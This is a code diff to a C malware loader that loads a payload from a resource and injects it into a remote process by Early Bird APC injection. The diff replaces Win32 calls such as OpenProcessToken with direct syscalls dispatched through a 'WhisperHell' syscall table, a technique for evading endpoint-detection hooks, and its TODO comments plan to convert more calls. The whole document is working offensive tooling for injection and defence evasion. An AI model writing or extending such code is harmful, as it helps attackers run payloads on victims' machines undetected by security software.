@@ -43,19 +43,33 @@ BOOL LoadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSi
 	return TRUE;
 }
 
-// TODO: use syscalls
 BOOL IsProcessElevated(HANDLE hProcess) {
+	NTSTATUS		status = 0;
 	HANDLE			hToken = NULL;
 	TOKEN_ELEVATION elevation = { 0 };
-	DWORD			dwSize = 0;
+	ULONG			dwSize = 0;
 
 	// TODO: use syscall NtOpenProcessToken
-	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
+	WhisperHell(g_SyscallsTable.NtOpenProcessToken.wSystemCall);
+	if ((status = NtOpenProcessToken(
+		hProcess,
+		TOKEN_QUERY,
+		&hToken))
+		!= 0x0) {
+		PRINTA("[!] NtOpenProcessToken Failed With Error : 0x%0.8X \n", GetLastError());
 		return FALSE;  // Assume not elevated if we can't open the token
 	}
 
 	// TODO: use syscall NtQueryInformationToken
-	if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
+	WhisperHell(g_SyscallsTable.NtQueryInformationToken.wSystemCall);
+	if ((status = NtQueryInformationToken(
+		hToken,
+		TokenElevation,
+		&elevation,
+		(ULONG)sizeof(elevation),
+		&dwSize))
+		!= 0x0) {
+		PRINTA("[!] GetTokenInformation Failed With Error : 0x%0.8X \n", GetLastError());
 		WhisperHell(g_SyscallsTable.NtClose.wSystemCall);
 		if (NtClose(hToken) != 0x0) {
 			PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", GetLastError());
@@ -441,12 +455,15 @@ BOOL RemoteEarlyBirdApcInjectionViaSyscalls(HANDLE hParentProcess, LPCSTR pstrSa
 	PRINTA("[i] Press <Enter> To Queue The APC ... \n");
 	GETCHAR();
 
+	// TODO: use syscall NtQueueApcThread
+	// Queue the APC to the thread
 	if (!QueueUserAPC((PAPCFUNC)pInjectedAddress, hThread, NULL)) {
 		PRINTA("[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 	PRINTA("[+] APC Queued Successfully To Thread With TID : %d\n", GetThreadId(hThread));
 
+	// TODO: use syscall NtRemoveProcessDebug
 	// Detach the debugger
 	if (!DebugActiveProcessStop(dwProcessId)) {
 		PRINTA("[!] DebugActiveProcessStop Failed With Error : %d \n", GetLastError());
@@ -462,6 +479,8 @@ BOOL RemoteEarlyBirdApcInjectionViaSyscalls(HANDLE hParentProcess, LPCSTR pstrSa
 		return FALSE;
 	}
 
+	// TODO: use syscall NtFreeVirtualMemory
+	// Clean up
 	if (!VirtualFreeEx(hProcess, pInjectedAddress, 0, MEM_RELEASE)) {
 		PRINTA("[!] VirtualFreeEx Failed With Error : %d \n", GetLastError());
 		return FALSE;
